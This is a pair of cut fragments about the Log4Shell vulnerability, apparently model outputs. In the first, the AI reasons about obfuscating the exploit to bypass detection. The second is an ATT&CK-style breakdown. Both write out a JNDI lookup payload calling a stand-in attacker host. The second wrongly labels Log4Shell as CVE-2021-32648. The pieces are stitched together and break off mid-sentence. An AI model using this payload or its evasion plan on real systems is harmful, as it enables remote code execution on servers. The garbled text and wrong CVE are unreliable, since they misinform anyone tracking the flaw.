Also, obfuscation is needed to bypass detection, and specific payload execution steps.\n\nFirst, I should start by understanding the original exploit. The log4shell exploit involves sending a payload that uses JNDI lookups to trigger remote code execution. For example, ${jndi:ldap://attacker.com/evil} would trigger a lookup to the attacker's LDAP server, which",

Let's break down the task step by step:\n\n**Step 1: Identify attack vectors and techniques (MITRE ATT&CK)**\n\nThe attack vector for CVE-2021-32648, also known as Log4Shell, is primarily through the exploitation of the Java Naming and Directory Interface (JNDI) feature in Log4j. The attacker sends a specially crafted string that includes a JNDI lookup, which can lead to remote code execution (RCE) when logged.\n\n- **Tactic:** Initial Access\n- **Technique:** Exploit Public-Facing Application (T1190)\n- **Sub-techniques/Tools used:** \n  - Log4Shell Payload: `${jndi:ldap://attacker.com/bad}` or similar JNDI strings leading to malicious servers\n\n**Step 2: Detect evasion attempts",
